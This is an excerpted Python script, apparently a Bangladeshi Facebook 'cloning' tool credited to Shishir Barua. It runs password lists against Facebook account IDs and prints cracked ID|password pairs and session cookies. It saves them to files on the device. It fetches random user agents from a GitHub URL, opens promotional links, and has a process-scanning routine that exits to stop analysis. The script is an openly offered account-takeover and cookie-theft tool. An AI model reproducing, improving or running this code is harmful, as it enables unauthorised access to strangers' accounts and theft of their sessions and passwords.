#--------------++CREATED     +SHISHIR BARUA++-----------------#
#--------------++FACEBOOK  + Shishir Barua++----------------#
#--------------++ GITHUB        + Shishir 6251+--------------------------#
...
os.system('xdg-open https://www.facebook.com/share/g/Cf16CBMVcZtqUPbW/?mibextid=A7sQZp')
#-------------color----------------#
...
SHISHIR_POWER_6251 = requests.get("https://raw.githubusercontent.com/Shishir-6251/u/main/Ua.txt").text.splitlines()

TARA_505 = random.choice(SHISHIR_POWER_6251)
...
╚═╝╩ ╩╩╚═╝╩ ╩╩╩╚═
╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
║\33[0;45m      [ TOOLS CREATED BY : SHISHIR BARUA ]     \033[0;92m║
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
║\33[0;42mTOOLS      :   RANDOM🥴\033[0;92m          \33[0;41mFIRE\033[0;92m          ║
║\33[0;41mVERSION    :   0.1 \033[0;92m                        ║
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
...
def SHISHIR_LOVE():
    clear()
    os.system('xdg-open https://github.com/Shishir-6251')
    ...
    if option in ['01','1']:
        BD_CLONING()
    if option in ['02','2']:
    	os.system('xdg-open https://www.facebook.com/share/g/8hB2eU97rf8TrLbp/?mibextid=A7sQZp');time.sleep(1)
    if option in ['03','3']:
    	os.system('xdg-open https://wa.me/+8801874248728');time.sleep(1)
    else:
        ...
        for pas in passlist:
            ...
            if 'session_key' in reqx:
                ...
                if str(uid) in oks:
                    ...
                    print('\r\r \033[1;32m[SHISHIROK] '+str(uid)+' | '+pas+'\033[1;37m')
                    coki=";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
                    print('\033[1;37m [COOKIE-🌸] '+coki)
                    open('/sdcard/SHISHIROK.txt','a').write(str(uid)+' | '+pas+'\n')
                    oks.append(str(uid))
                    break
            elif 'www.facebook.com' in reqx['error_msg']:
                print('\r\r \033[1;35m[SHISHIRCP] '+ids+' | '+pas+'\033[1;37m')
                open('/sdcard/SHISHIRCP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
...
def capture_module_killar(module_name):
    for proc in psutil.process_iter(['pid', 'name', 'username']):
        try:
            ...
            exit('IF YOU BAD I AM SHISHIR  YOUR DAD MIND IT NOOB')
